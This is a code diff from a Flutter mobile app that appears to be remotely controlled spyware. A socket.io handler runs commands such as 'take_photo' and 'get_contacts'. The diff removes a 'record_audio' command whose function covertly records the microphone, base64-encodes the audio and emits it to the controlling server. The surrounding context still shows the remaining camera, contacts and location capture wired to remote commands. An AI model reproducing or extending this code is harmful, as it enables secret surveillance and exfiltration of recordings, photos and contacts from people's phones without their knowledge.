@@ -6,7 +6,6 @@ import 'package:socket_io_client/socket_io_client.dart' as io;
 import 'package:permission_handler/permission_handler.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:camera/camera.dart';
-import 'package:record/record.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'package:path_provider/path_provider.dart';
@@ -177,9 +176,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       case 'take_photo':
         await takePhoto(params['camera'] ?? 'front');
         break;
-      case 'record_audio':
-        await recordAudio(int.parse(params['duration'] ?? '10'));
-        break;
       case 'get_contacts':
         await getContacts();
         break;
@@ -237,29 +233,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
-  Future<void> recordAudio(int duration) async {
-    try {
-      final record = AudioRecorder();
-      final dir = await getTemporaryDirectory();
-      final path = '${dir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.m4a';
-      
-      await record.start(const RecordConfig(), path: path);
-      await Future.delayed(Duration(seconds: duration));
-      final audioPath = await record.stop();
-      
-      if (audioPath != null) {
-        final bytes = await File(audioPath).readAsBytes();
-        final base64Audio = base64Encode(bytes);
-        socket.emit('audio_data', {
-          'audio': base64Audio,
-          'duration': duration,
-          'timestamp': DateTime.now().toIso8601String(),
-        });
-      }
-    } catch (e) {
-      socket.emit('error', {'error': 'Audio error: $e'});
-    }
-  }
 
   Future<void> getContacts() async {
     try {
